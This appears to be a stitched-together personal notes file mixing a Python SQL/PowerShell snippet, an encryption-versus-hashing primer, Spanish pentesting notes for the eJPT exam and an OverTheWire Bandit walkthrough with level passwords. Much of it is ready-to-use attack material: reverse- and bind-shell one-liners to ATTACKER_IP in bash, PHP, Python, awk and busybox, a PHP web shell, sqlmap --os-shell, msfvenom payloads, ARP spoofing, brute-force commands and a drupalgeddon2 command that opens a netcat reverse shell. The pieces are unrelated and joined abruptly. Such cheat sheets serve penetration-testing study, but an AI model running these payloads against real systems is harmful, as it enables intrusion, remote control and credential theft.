result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True)

# Print the output of the command

print(result.stdout)

Additional Considerations

```
•	Error Handling: Add appropriate error handling for database connection and PowerShell command execution.
•	Security: Ensure that credentials are stored securely and not hard-coded in the script.
•	Environment Configuration: Ensure that the necessary drivers for SQL Server (ODBC Driver 17 for SQL Server) and PowerShell are installed and configured on your machine.

```

Example with Error Handling

Here’s an improved example with basic error handling:

import pyodbc
import subprocess

def run_sql_query():
try:
# Define connection parameters
server = 'your_remote_server'
database = 'your_database'
username = 'your_username'
password = 'your_password'

```python
    # Establish the connection
    conn = pyodbc.connect(f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};UID={username};PWD={password}')
    cursor = conn.cursor()

    # Define a SQL query
    query = "SELECT TOP 10 * FROM your_table"

    # Execute the query
    cursor.execute(query)

    # Fetch and print the results
    rows = cursor.fetchall()
    for row in rows:
        print(row)

except pyodbc.Error as e:
    print(f"Error connecting to SQL Server: {e}")
finally:
    if cursor:
        cursor.close()
    if conn:
        conn.close()

```

def run_powershell_command():
try:
# Define the PowerShell command
powershell_command = 'Get-Process'

```python
    # Execute the PowerShell command
    result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True)

    # Print the output of the command
    print(result.stdout)
except subprocess.SubprocessError as e:
    print(f"Error executing PowerShell command: {e}")

```

if **name** == "**main**":
run_sql_query()
run_powershell_command()

This example separates the SQL query and PowerShell command into functions and includes basic error handling.



///////////////////


🔐 Encryption

Purpose: Secrecy

    What it does: Transforms data into a format that only authorized parties can read.

    Reversible: ✅ Yes (with the right key)

    Example Use Case: Sending a confidential message over the internet.

    Common Algorithms: AES, RSA, Blowfish

    Example:

        Plain: hello

        Encrypted (with key): A1B2C3D4...

Important: If someone has the key, they can decrypt and get the original message.
🔢 Hashing

Purpose: Data integrity

    What it does: Maps data of arbitrary size to fixed-size values (hash).

    Reversible: ❌ No (one-way function)

    Example Use Case: Password storage, verifying file integrity.

    Common Algorithms: SHA-256, MD5, bcrypt

    Example:

        Input: password123

        Hash: ef92b778bafe... (can’t turn it back into password123)

Bonus: Even a tiny change in the input gives a completely different hash (called the avalanche effect).
🔤 Encoding

Purpose: Data transformation for interoperability

    What it does: Converts data into a different format using a scheme.

    Reversible: ✅ Yes (no secret)

    Example Use Case: Sending binary data over text-based protocols like email or URLs.

    Common Schemes: Base64, URL encoding, ASCII

    Example:

        Text: hello

        Base64: aGVsbG8=

Important: Encoding is not about security—anyone can decode it.
TL;DR:
Feature	Encryption	Hashing	Encoding
Reversible	✅ With key	❌ One-way	✅ Easily
Purpose	Privacy	Integrity	Data format
Secure?	✅ (with key)	✅ (one-way)	❌ (not for security)
Use Case	Secure messages	Password storage	Data transmission



## ¿Qué es una Shell?

Una **shell** es un software que permite al usuario interactuar con el sistema operativo. Puede ser una interfaz gráfica, aunque usualmente es una **interfaz de línea de comandos (CLI)**, y su forma dependerá del sistema operativo del sistema objetivo.

En **ciberseguridad**, el término suele referirse a una sesión de shell específica que un atacante utiliza al acceder a un sistema comprometido, permitiéndole ejecutar comandos y software. Esto posibilita al atacante llevar a cabo varias actividades:

* **Control remoto del sistema:** permite ejecutar comandos o software en el sistema objetivo de forma remota.
* **Escalada de privilegios:** si el acceso inicial es limitado, se pueden buscar formas de obtener permisos más altos o acceso administrativo.
* **Exfiltración de datos:** tras conseguir acceso, el atacante puede leer y copiar datos sensibles.
* **Persistencia y mantenimiento de acceso:** se pueden crear usuarios, guardar credenciales o instalar puertas traseras para mantener el acceso.
* **Actividades post-explotación:** como desplegar malware, crear cuentas ocultas o eliminar información.
* **Acceso a otros sistemas en la red:** utilizando la shell como punto de pivote para comprometer otros sistemas. A esto se le conoce como **pivoting**.

---

## Reverse Shell (Shell Reversa)

Una **shell reversa**, también conocida como *connect-back shell*, es una técnica popular para obtener acceso a un sistema comprometido. En este caso, la conexión se inicia **desde el sistema víctima hacia la máquina del atacante**, lo que ayuda a **evadir firewalls y otras defensas de red**.

### ¿Cómo funciona?

#### 1. Establecer un listener con Netcat

```bash
nc -lvnp 443
```

* `-l`: escuchar conexiones.
* `-v`: modo detallado (verbose).
* `-n`: evita resolución DNS.
* `-p 443`: usa el puerto 443 para escuchar conexiones (pueden usarse puertos comunes como 53, 80, 443 para evadir detección).

#### 2. Ejecutar el payload de reverse shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

#### 3. Conexión establecida

```bash
attacker@attacker-system:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@target-system:~$
```

---

## Bind Shell (Shell de Enlace)

Una **bind shell** escucha conexiones en un puerto del sistema comprometido, exponiendo una shell cuando un atacante se conecta a él. Se usa si el sistema víctima **no permite conexiones salientes**, aunque es menos común ya que necesita estar escuchando activamente (más fácil de detectar).

### ¿Cómo funciona?

#### 1. Establecer el bind shell en el objetivo

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

#### 2. El atacante se conecta

```bash
nc -nv TARGET_IP 8080
```

#### 3. Conexión establecida

```bash
attacker@attacker-system:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@target-system:~$
```

---

## Shell Listeners (Escuchas de Shell)

Como se ha visto, una **shell reversa** conecta desde el sistema comprometido hacia el atacante. Existen diversas herramientas para escuchar esa conexión y facilitar la interacción con la shell obtenida:

### 🧠 Rlwrap

```bash
rlwrap nc -lvnp 443
```

Permite usar flechas y recordar comandos anteriores.

### 🛡️ Ncat

```bash
ncat -lvnp 4444
ncat --ssl -lvnp 4444
```

* `--ssl`: cifra la conexión.

### 🔗 Socat

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

---

## Shell Payloads

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP

```php
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python

```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Otros

#### Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

#### AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

#### BusyBox

```bash
busybox nc ATTACKER_IP 443 -e sh
```

---

## Web Shell

Una **web shell** es un script que se ejecuta en un servidor web comprometido para ejecutar comandos a través de este. Generalmente, se trata de archivos en PHP, ASP, JSP, etc.

### Ejemplo simple en PHP

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Se puede acceder mediante una URL como:

```
http://victima.com/uploads/shell.php?cmd=whoami
```

### Web Shells Populares

* **p0wny-shell**: shell PHP minimalista con ejecución remota.
* **b374k shell**: PHP shell con manejo de archivos y ejecución de comandos.
* **c99 shell**: shell avanzada con múltiples funcionalidades.

📚 Más información en: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php)


Introducción
Estas notas te ayudarán a completar tu examen para la certificación eJPT, esto es solo
una guía y lo más importante es que hayas entendido previamente los conceptos
necesarios para aprobar el examen.
Enumeración
fping
fping -a -g {RANGO IP} 2>/dev/null
ejemplo fping
fping -a -g 10.10.10.0/8 2>/dev/null
Nmap barrido de ping:
nmap -sn 10.10.10.0/8 | grep -oP '(?<=Resultado de nmap para )[^ ]*'
Enumeración de activos vivos
Una vez hayamos encontrado los activos que están vivos, comenzamos a enumerar los
puertos y servicios en cada uno de ellos.
Nmap TCP - Escaneo Rápido
Escaneamos los 1000 puertos TCP más utilizados, guardamos los resultados.
nmap 10.10.10.10 -Pn -sC -sV --open -n -oN fast-tcp.nmap
Nmap TCP - Escaneo Completo
Escaneamos los 65.535 puertos TCP y guardamos los resultados.
nmap 10.10.10.10 -p- -Pn -sC -sV --open -n -oN full-tcp.nmap
Nmap UDP - Escaneo Rápido
Escaneamos los 1000 puertos TCP más utilizados, guardamos los resultados.
nmap 10.10.10.10 -sU -sV -Pn -n -oN fast-udp.nmap
Tipos de escaneos
-sS: Escaneo TCP SYN
-sT: Escaneo TCP Connect
-sU: Escaneo UDP
-sn: Escaneo de descubrimiento con ping
-sV: Información de la versión del servicio
-sC: Ejecución de scripts por defecto
-O: Información del sistema operativo
Encontrar Vulnerabilidades Comunes
Una vez realizados todos los escaneos e identificados los puertos abiertos en los
activos, es hora de comprobar si algún servicio es vulnerable.
Puertos comunes a revisar
Puerto Protocolo
21 FTP
22 SSH
23 TELNET
25 SMTP
53 DNS
80 HTTP
443 HTTPS
110 POP3
115 SFTP
143 IMAP
135 MSRPC
137 NETBIOS
138 NETBIOS
139 NETBIOS
445 SMB
3306 MYSQL
1433 MYSQL
3389 RDP
Uso de Nmap como escáner de vulnerabilidades ligero
nmap -sV --script=vulners -v 10.10.10.1
si no tiene instalado vulners, encuentralo aquí: https://github.com/vulnersCom/nmap-
vulners
nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap
-iL : Fichero con la lista de activos (uno por linea)
Puerto 21 - Enumeración FTP
A veces las pistas están aquí. Las versiones antiguas de FTP pueden ser vulnerables,
comprueba siempre la versión. Busca el exploit usando Google / Searchsploit / Rapid7.
Si encuentras alguna credencial, pruébala en SSH / página web de inicio de sesión /
base de datos.
Enumerar servicio de FTP con Nmap
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-
backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip
Todos los scripts de enumeración de FTP en Nmap
nmap --script=ftp-* -p 21 10.10.10.1
Conexión por FTP
ftp 10.10.10.1
ncftp 10.10.10.1
Tip: Recuerda probar con la credenciales anonymous:anonymous y ftp:ftp
Fuerza bruta a FTP con usuario conocido
hydra -l $user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.1:21
medusa -h 10.10.10.1 -u $user -P /usr/share/wordlists/rockyou.txt -M ftp
Enumerar usuario por FTP
ftp-user-enum.pl -U users.txt -t 10.10.10.1
ftp-user-enum.pl -M iu -U users.txt -t $ip
Puedes encontrar el script aquí: https://pentestmonkey.net/tools/ftp-user-enum/ftp-
user-enum-1.0.tar.gz
Comandos útiles en FTP
• put # Subir un archivo.
• mput # Subir múltiples archivos.
• mget # Descargar múltiples archivos.
• get # Descargar un archivo.
• ls # listar contenido directorio.
• mget * # Descargar todo.
• binary = # Modo de transferencia binaria.
• ascii = # Modo de transferencia ASCII.
Archivos de configuración FTP
• ftpusers
• ftp.conf
• proftpd.conf
Versiones de FTP vulnerables
• ProFTPD-1.3.3c Backdoor
• ProFTPD 1.3.5 Mod_Copy Command Execution
• VSFTPD v2.3.4 Backdoor Command Execution
Puerto 445 - Enumeración SMB
Comprueba siempre SMB, es posible que tenga alguna vulnerabilidad de RCE. Recuerda
utilizar searchsploit, o google para comprobar si existe algún exploit disponible para
esa versión.
Escanear servicio NETBIOS/SMB con Nmap
nmap 192.168.1.0/24 -p 139,445 --open -oN smb.nmap
Escanear servicio NETBIOS/SMB con enum4linux-ng
enum4linux-ng.py 192.168.125.131
Escanear servicio NETBIOS/SMB con nbtscan
nbtscan -r 192.168.1.0/24
Enumerar el hostname
nmblookup -A 10.10.10.1
Comprueba sesiones nulas
smbmap -H 10.10.10.1
rpcclient -U "" -N 10.10.10.1
smbclient \\\\10.10.10.1\\recurso -N
Si te da el error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
smbclient -L //10.10.10.3/ --option='client min protocol=NT1'
Listar recursos compartidos
smbmap -H 10.10.1.1
smbclient -L 10.10.10.1 -U <user>%<pwd
echo exit | smbclient -L \\\\10.10.10.10
nmap --script smb-enum-shares -p 139,445 10.10.10.10
Scripts de vulnerabilidades SMB con Nmap
nmap 10.10.10.10 --script smb-vuln* -p 139,445
Versiones vulnerables
• Windows NT, 2000, and XP (SMB1) - VULNERABLE: Null Sessions se crean por defecto
• Windows 2003, and XP SP2 en adelante - NO VULNERABLE: Null Sessions no se crean por
defecto
• Samba (Unix) servers
Lista de versiones de SMB y versiones de Windows correspondientes
• SMB1 – Windows 2000, XP and Windows 2003.
• SMB2 – Windows Vista SP1 and Windows 2008
• SMB2.1 – Windows 7 and Windows 2008 R2
• SMB3 – Windows 8 and Windows 2012.
Puertos 80,443,8080 - Enumeración y Explotación de
Aplicaciones Web
Checklist de enumeración de aplicaciones web
1. Comprueba toda la página web y lo que muestra.
2. Lee cada página, busca correos electrónicos, nombres, información del usuario,
etc.
3. Descubrimiento de directorios (gobuster, dirb, ffuf, wfuzz)
4. Enumera la aplicación, ¿cuál es el CMS y la versión? ¿Página de instalación del
servidor? (wappalyzer, whatweb)
5. Comprueba si hay posibles vulnerabilidades de LFI, RFI, inyección SQL, XXE y
subida de archivos.
6. Comprueba si hay una página por defecto, identifica la versión del servidor.
7. Ver Código Fuente: a. Comprobar si hay valores ocultos b. Compruebe si hay
comentarios/observaciones del desarrollador c. Comprobación de código extraño
d. Comprobación de contraseñas
8. Comprobar el archivo robots.txt
9. Escaneo web
VirtualHosting
Es posible que el sitio web cargue unicamente desde un cierto dominio
sudo vim /etc/hosts
10.0.0.1 static.foobar.org
Identificación de tecnologías/CMS
Encuentra las tecnologías que utiliza el sitio web
Wappalyzer
Extensión para el navegador https://addons.mozilla.org/es/firefox/addon/wappalyzer/
Whatweb
whatweb http://10.10.10.11
Certificado TLS/SSL
Ver información sobre el certificado
openssl s_client -connect target.site:443
Descubrimiento de directorios/archivos
Encuentra directorios y archivos que te pueden interesar
gobuster dir -u 10.10.10.181 -w /usr/share/seclists/Discovery/Web-Content/common.txt -
t 100
Gobuster con top1000-robots
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-
Content/Top1000-RobotsDisallowed.txt; gobuster -u http://10.10.10.10. -w Top1000-
RobotsDisallowed.txt
Gobuster Completo + User-Agent
gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w
/usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux
x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
Gobuster archivos con extensiones
gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100
-x txt,php
ffuf busqueda de archivos
ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
Posibles extensiones
Inyección SQL (Automatizada)
sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz
Comandos SQLmap
Determina las bases de datos:
sqlmap -u http://10.10.10.15/?id=4 --dbs
Determina las tablas:
sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables
imprime el contenido de la tabla:
sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump
intenta conseguir una shell:
sqlmap -u http://10.10.10.15/?id=4 --os-shell
XSS
Intenta explotarla en campos de input provenientes de:
Cabeceras de la petición
Cookies
Forumularios
POST parametros
GET parametros
Prueba de XSS
<script>alert(1)</script>
<i>some text</i>
Robo de cookies:
<script>alert(document.cookie)</script>
Puerto 3306 - MySQL
Conectarse a una base de datos
mysql --user=root --port=13306 -p -h 172.16.64.81
SHOW databases; SHOW tables FROM databases; USE database; SELECT * FROM table;
Cracking de Contraseñas
Unshadow
Si encuentras los archivos passwd y shadow podras convertirlos en un formato para john
y crackear las contraseñas
unshadow passwd shadow > unshadow
John The Ripper
john --wordlist=path/to/wordlist.txt path/to/hashes.txt
Redes - Enrutamiento
Te recomiendo que te sientas cómodo con los conceptos generales de redes y
enrutamiento, incluyendo ser capaz de leer y entender archivos .PCAP.
Enrutamiento IP y tablas de enrutamiento
ip route - imprime la tabla de enrutamiento para el host en el que se encuentra
ip route add RUTA_A via RUTA_DESDE - añadir una ruta a una nueva red si estás en una
red conmutada y necesitas pivotar
ARP Spoofing
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
SSH Tunneling / Port Forwarding
local port forwarding
el host de destino 192.168.0.100 está ejecutando un servicio en el puerto 8888 y desea
que ese servicio esté disponible en el puerto 7777 de localhost
ssh -L 7777:localhost:8888 user@192.168.0.100
remote port forwarding
estás ejecutando un servicio en localhost puerto 9999 y quieres que ese servicio esté
disponible en el host de destino 192.168.0.100 puerto 12340
ssh -R 12340:localhost:9999 user@192.168.0.100
Local proxy through remote host
Quieres enrutar el tráfico de red a través de un host remoto target.host así que creas
un proxy socks local en el puerto 12001 y configuras los ajustes SOCKS5 a
localhost:12001
ssh -C2qTnN -D 12001 user@target.host
DNS
nslookup mysite.com
dig mysite.com
Metasploit
Recomiendo que te familiarices con metasploit y meterpreter por si encuentras un RCE y
quieres conseguir una shell.
Comandos básicos msfconsole
search x
use x
info
show options, show advanced options
SET X (e.g. set RHOST 10.10.10.10, set payload x)
Ponerse a la escucha (listener)
Interactivo
msfconsole
use exploit/multi/handler
set payload <payload>
set LHOST <local-ip>
set LPORT <port>
run
Oneliner msfconsole -q -x "use exploit/multi/handler;set payload
windows/x64/meterpreter_reverse_tcp;set lhost 10.0.0.1;set lport 9001;run"
Comandos útiles Meterpreter (reverse shell)
background
sessions -l
sessions -i 1
sysinfo, ifconfig, route, getuid
getsystem (privesc)
bypassuac
download x /root/
upload x C:\\Windows
shell
use post/windows/gather/hashdump
Msfvenom
Generación de payloads
Windows msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10
LPORT=9001 -f exe -o reverse.exe
Linux msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001
-f elf -o reverse.elf
Reverse Shells
Establecer una conexión inversa
Máquina atacante
nc -nlvp 443
Máquina víctima
Linux: nc <ip-atacante> -e /bin/bash
Windows: nc <ip-atacante> -e cmd.exe
Recurso: https://www.revshells.com/

////////////////////////


BANDIT0
The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.

ssh -p 2220 bandit0@bandit.labs.overthewire.org
passw: bandit0

----------------------------------------------------
BANDIT LEVEL 0 → LEVEL 1
The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.

cat /home/bandit0/readme 
The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

----------------------------------------------------
BANDIT LEVEL 1 → LEVEL 2
The password for the next level is stored in a file called - located in the home directory

ssh -p 2220 bandit1@bandit.labs.overthewire.org
passw: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

cat /home/bandit1/-
263JGJPfgU6LtdEvgfWU1XP5yac29mFx

----------------------------------------------------
BANDIT LEVEL 2 → LEVEL 3
The password for the next level is stored in a file called spaces in this filename located in the home directory

ssh -p 2220 bandit2@bandit.labs.overthewire.org
passwd: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx

cat /home/bandit2/spaces\ in\ this\ filename 
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

----------------------------------------------------
BANDIT LEVEL 3 → LEVEL 4
The password for the next level is stored in a hidden file in the inhere directory.

ssh -p 2220 bandit3@bandit.labs.overthewire.org
passwd: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

cat /home/bandit3/inhere/...Hiding-From-You 
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

----------------------------------------------------
BANDIT LEVEL 4 → LEVEL 5
The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.

ssh -p 2220 bandit4@bandit.labs.overthewire.org
passwd: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

file ./-file07
./-file07: ASCII text

cat ./-file07
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

----------------------------------------------------
BANDIT LEVEL 5 → LEVEL 6
The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:

    human-readable
    1033 bytes in size
    not executable
    
ssh -p 2220 bandit5@bandit.labs.overthewire.org
passwd: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw


bandit5@bandit:~/inhere$ find . -type f -size 1033c 2>/dev/null
./maybehere07/.file2
bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

----------------------------------------------------
BANDIT LEVEL 6 → LEVEL 7
The password for the next level is stored somewhere on the server and has all of the following properties:

    owned by user bandit7
    owned by group bandit6
    33 bytes in size
    
ssh -p 2220 bandit6@bandit.labs.overthewire.org
passwd: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj


----------------------------------------------------
BANDIT LEVEL 7 → LEVEL 8
The password for the next level is stored in the file data.txt next to the word millionth

ssh -p 2220 bandit7@bandit.labs.overthewire.org
passwd: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj


dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

----------------------------------------------------
BANDIT LEVEL 8 → LEVEL 9
The password for the next level is stored in the file data.txt and is the only line of text that occurs only once

ssh -p 2220 bandit8@bandit.labs.overthewire.org
passwd: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

bandit8@bandit:~$ sort data.txt | uniq -c | sort -n
      1 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
     10 0BKVRLEJQcpNx8wnSPxDLFnFKlQafKK6
     10 0eJPctF8gK96ykGBBaKydhJgxSpTlJtz
     10 0kJ7XHD4gVtNSZIpqyP1V45sfz9OBLFo
     ....

----------------------------------------------------
BANDIT LEVEL 9 → LEVEL 10
The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.     

ssh -p 2220 bandit9@bandit.labs.overthewire.org
passwd: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

bandit9@bandit:~$ strings data.txt | grep "==="
}========== the
3JprD========== passwordi
~fDV3========== is
D9========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

----------------------------------------------------
BANDIT LEVEL 10 → LEVEL 11
The password for the next level is stored in the file data.txt, which contains base64 encoded data

ssh -p 2220 bandit10@bandit.labs.overthewire.org
passwd: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

bandit10@bandit:~$ cat data.txt | base64 -d       (decode)
The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

bandit10@bandit:~$ echo -n "The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr" | base64    (encode)
VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2ZaS2IwUlJzREZTR3NnMlJXbnBOVmozcVJy


-------------------------------------------------------
BANDIT LEVEL 11 → LEVEL 12
The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions

ssh -p 2220 bandit11@bandit.labs.overthewire.org
passwd: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4


--------------------------------------------------------
BANDIT LEVEL 12 → LEVEL 13
The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!)


ssh -p 2220 bandit12@bandit.labs.overthewire.org
passwd: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. 
00000000: 1f8b 0808 dfcd eb66 0203 6461 7461 322e  .......f..data2.
00000010: 6269 6e00 013e 02c1 fd42 5a68 3931 4159  bin..>...BZh91AY
00000020: 2653 59ca 83b2 c100 0017 7fff dff3 f4a7  &SY.............
00000030: fc9f fefe f2f3 cffe f5ff ffdd bf7e 5bfe  .............~[.
00000040: faff dfbe 97aa 6fff f0de edf7 b001 3b56  ......o.......;V
00000050: 0400 0034 d000 0000 0069 a1a1 a000 0343  ...4.....i.....C
00000060: 4686 4341 a680 068d 1a69 a0d0 0068 d1a0  F.CA.....i...h..
00000070: 1906 1193 0433 5193 d4c6 5103 4646 9a34  .....3Q...Q.FF.4
00000080: 0000 d320 0680 0003 264d 0346 8683 d21a  ... ....&M.F....
00000090: 0686 8064 3400 0189 a683 4fd5 0190 001e  ...d4.....O.....
000000a0: 9034 d188 0343 0e9a 0c40 69a0 0626 4686  .4...C...@i..&F.
000000b0: 8340 0310 d340 3469 a680 6800 0006 8d0d  .@...@4i..h.....
000000c0: 0068 0608 0d1a 64d3 469a 1a68 c9a6 8030  .h....d.F..h...0
000000d0: 9a68 6801 8101 3204 012a ca60 51e8 1cac  .hh...2..*.`Q...
000000e0: 532f 0b84 d4d0 5db8 4e88 e127 2921 4c8e  S/....].N..')!L.
000000f0: b8e6 084c e5db 0835 ff85 4ffc 115a 0d0c  ...L...5..O..Z..
00000100: c33d 6714 0121 5762 5e0c dbf1 aef9 b6a7  .=g..!Wb^.......
00000110: 23a6 1d7b 0e06 4214 01dd d539 af76 f0b4  #..{..B....9.v..
00000120: a22f 744a b61f a393 3c06 4e98 376f dc23  ./tJ....<.N.7o.#
00000130: 45b1 5f23 0d8f 640b 3534 de29 4195 a7c6  E._#..d.54.)A...
00000140: de0c 744f d408 4a51 dad3 e208 189b 0823  ..tO..JQ.......#
00000150: 9fcc 9c81 e58c 9461 9dae ce4a 4284 1706  .......a...JB...
00000160: 61a3 7f7d 1336 8322 cd59 e2b5 9f51 8d99  a..}.6.".Y...Q..
00000170: c300 2a9d dd30 68f4 f9f6 7db6 93ea ed9a  ..*..0h...}.....
00000180: dd7c 891a 1221 0926 97ea 6e05 9522 91f1  .|...!.&..n.."..
00000190: 7bd3 0ba4 4719 6f37 0c36 0f61 02ae dea9  {...G.o7.6.a....
000001a0: b52f fc46 9792 3898 b953 36c4 c247 ceb1  ./.F..8..S6..G..
000001b0: 8a53 379f 4831 52a3 41e9 fa26 9d6c 28f4  .S7.H1R.A..&.l(.
000001c0: 24ea e394 651d cb5c a96c d505 d986 da22  $...e..\.l....."
000001d0: 47f4 d58b 589d 567a 920b 858e a95c 63c1  G...X.Vz.....\c.
000001e0: 2509 612c 5364 8e7d 2402 808e 9b60 02b4  %.a,Sd.}$....`..
000001f0: 13c7 be0a 1ae3 1400 4796 4370 efc0 9b43  ........G.Cp...C
00000200: a4cb 882a 4aae 4b81 abf7 1c14 67f7 8a34  ...*J.K.....g..4
00000210: 0867 e5b6 1df6 b0e8 8023 6d1c 416a 28d0  .g.......#m.Aj(.
00000220: c460 1604 bba3 2e52 297d 8788 4e30 e1f9  .`.....R)}..N0..
00000230: 2646 8f5d 3062 2628 c94e 904b 6754 3891  &F.]0b&(.N.KgT8.
00000240: 421f 4a9f 9feb 2ec9 83e2 c20f fc5d c914  B.J..........]..
00000250: e142 432a 0ecb 0459 1b15 923e 0200 00    .BC*...Y...>...




















    











----------------------------------------------------
----------------------------------------------------
Useful toold installed on machines: 
    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

A:
python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'


T:
nc -lnvp 9000


